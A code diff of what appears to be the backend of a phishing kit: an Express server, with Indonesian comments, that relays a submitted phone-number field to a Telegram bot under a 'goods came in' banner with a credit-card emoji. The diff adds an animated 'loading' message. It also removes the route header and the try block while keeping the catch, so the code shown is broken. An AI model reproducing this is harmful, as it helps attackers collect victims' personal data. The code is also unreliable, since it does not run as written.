@@ -30,93 +30,96 @@ app.get("/", (req,res)=>{
     
 });
 
-/* ROUTE */
-app.post("/nmrx", async(req,res) =>{
+/* ANIMASI TITIK */
+        let dot = 1;
 
-    try{
-
-        console.log(
-            "DATA MASUK:"
-        );
-
-        console.log(
-            req.body
-        );
-
-        console.log(
-            "BOT:",
-            BOT_TOKEN
-        );
-
-        console.log(
-            "CHAT:",
-            CHAT_ID
-        );
-
-        const {
-            
-            nmrx
-            
-        } = req.body;
-
-        if(
-            !nmrx
-        ){
-
-            return res.status(400).json({
-
-                success:false,
-                message:"Data tidak lengkap"
-
-            });
-
-        }
-
-        /* PESAN TELEGRAM */
-        const text = `
+        const loadingText = () => `
 💳 <b>| BARANG MASUK BANG |</b> 💳
            × <code>${nmrx}</code> ×
 
-<b>×  NMR  ×</b>   : <b>${nmrx}</b>
-<i>POX . . . .</i>
+<b>× NMR ×</b> : <b>${nmrx}</b>
+<i>POX ${".".repeat(dot)}</i>
 
 <b>©️ By PxxStudix</b>
         `;
 
-        /* KIRIM TELEGRAM */
-        await axios.post(
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-        {
+        /* KIRIM PESAN AWAL */
+        const sent = await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                chat_id: CHAT_ID,
+                text: loadingText(),
+                parse_mode: "HTML"
+            }
+        );
 
-            chat_id:
-            CHAT_ID,
+        const messageId =
+            sent.data.result.message_id;
 
-            text:
-            text,
+        /* LOOP ANIMASI */
+        for (let i = 0; i < 10; i++) {
 
-            parse_mode:
-            "HTML"
+            await new Promise(resolve =>
+                setTimeout(resolve, 500)
+            );
+
+            dot++;
+
+            if (dot > 4) {
+
+                dot = 1;
+
+            }
+
+            await axios.post(
+                `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
+                {
+                    chat_id: CHAT_ID,
+                    message_id: messageId,
+                    text: loadingText(),
+                    parse_mode: "HTML"
+                }
+            );
 
         }
 
-     );
+        /* PESAN AKHIR */
+        const finalText = `
+💳 <b>| BARANG MASUK BANG |</b> 💳
+           × <code>${nmrx}</code> ×
+
+<b>× NMR ×</b> : <b>${nmrx}</b>
+<i>POX DONE ✅</i>
+
+<b>©️ By PxxStudix</b>
+        `;
+
+        await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
+            {
+                chat_id: CHAT_ID,
+                message_id: messageId,
+                text: finalText,
+                parse_mode: "HTML"
+            }
+        );
 
         res.json({
 
-            success:true
+            success: true
 
         });
 
-    }catch(error){
+    } catch (error) {
 
         console.log(
             error.response?.data ||
             error.message
-       );
+        );
 
         res.status(500).json({
 
-            success:false
+            success: false
 
         });
 
